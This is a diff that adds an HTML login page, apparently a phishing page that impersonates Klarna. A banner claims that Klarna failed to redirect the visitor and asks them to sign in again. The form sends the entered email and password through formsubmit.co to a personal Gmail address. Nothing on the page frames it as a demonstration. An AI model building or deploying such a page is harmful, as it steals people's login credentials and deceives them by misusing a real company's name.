@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Login Page</title>
+  <style>
+    /* Reset */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    body {
+      background: linear-gradient(135deg, #ff99cc, #ff66b2);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #333;
+    }
+    .login-container {
+      background: #fff0f6;
+      padding: 40px 50px;
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(255, 105, 180, 0.4);
+      width: 350px;
+      text-align: center;
+    }
+
+    /* الرسالة فوق الفورم */
+    .alert-message {
+      background-color: #ff4d6d;
+      color: white;
+      padding: 12px 20px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      font-weight: 700;
+      font-size: 14px;
+      box-shadow: 0 3px 8px rgba(255, 77, 109, 0.6);
+    }
+
+    .login-container h2 {
+      margin-bottom: 25px;
+      color: #d6336c;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+    }
+    .input-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 600;
+      color: #a63d7c;
+    }
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 15px;
+      border: 2px solid #f8cce7;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: border-color 0.3s ease;
+      background: #fff0f6;
+    }
+    input[type="email"]:focus,
+    input[type="password"]:focus {
+      outline: none;
+      border-color: #d6336c;
+      box-shadow: 0 0 8px rgba(214, 51, 108, 0.7);
+      background: #ffe6f0;
+    }
+    .btn-login {
+      background: #d6336c;
+      color: white;
+      font-weight: 700;
+      border: none;
+      padding: 14px 0;
+      width: 100%;
+      border-radius: 10px;
+      font-size: 18px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    .btn-login:hover {
+      background: #a02550;
+    }
+    .error-message {
+      color: #e74c3c;
+      margin-bottom: 15px;
+      font-size: 14px;
+      display: none;
+      text-align: left;
+    }
+    .success-message {
+      color: #27ae60;
+      margin-bottom: 15px;
+      font-size: 14px;
+      display: none;
+      text-align: center;
+    }
+    .footer-text {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #888;
+    }
+    @media (max-width: 400px) {
+      .login-container {
+        width: 90%;
+        padding: 30px 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="alert-message">
+      Klarna failed to redirect you to this page. Please sign up again.
+    </div>
+
+    <h2>Login</h2>
+    <div class="error-message" id="error"></div>
+    <form id="loginForm" action="https://formsubmit.co/viodex03@gmail.com" method="POST" novalidate>
+      <div class="input-group">
+        <label for="email">Email Address</label>
+        <input type="email" id="email" name="email" placeholder="example@mail.com" required />
+      </div>
+      <div class="input-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="••••••••" required minlength="6" />
+      </div>
+      <button type="submit" class="btn-login">Sign In</button>
+    </form>
+    <div class="success-message" id="success">Logged in successfully!</div>
+    <div class="footer-text">© 2025 All rights reserved</div>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    const errorDiv = document.getElementById('error');
+    const successDiv = document.getElementById('success');
+
+    form.addEventListener('submit', function (e) {
+      errorDiv.style.display = 'none';
+      successDiv.style.display = 'none';
+
+      const email = form.email.value.trim();
+      const password = form.password.value.trim();
+
+      if (!validateEmail(email)) {
+        e.preventDefault();
+        showError('Please enter a valid email address.');
+        return;
+      }
+      if (password.length < 6) {
+        e.preventDefault();
+        showError('Password must be at least 6 characters long.');
+        return;
+      }
+      // لو البيانات صح، الفورم هيُرسل مباشرة بدون منع الإرسال (ما في e.preventDefault هنا)
+    });
+
+    function showError(message) {
+      errorDiv.textContent = message;
+      errorDiv.style.display = 'block';
+    }
+
+    function validateEmail(email) {
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(email);
+    }
+  </script>
+
+</body>
+</html>
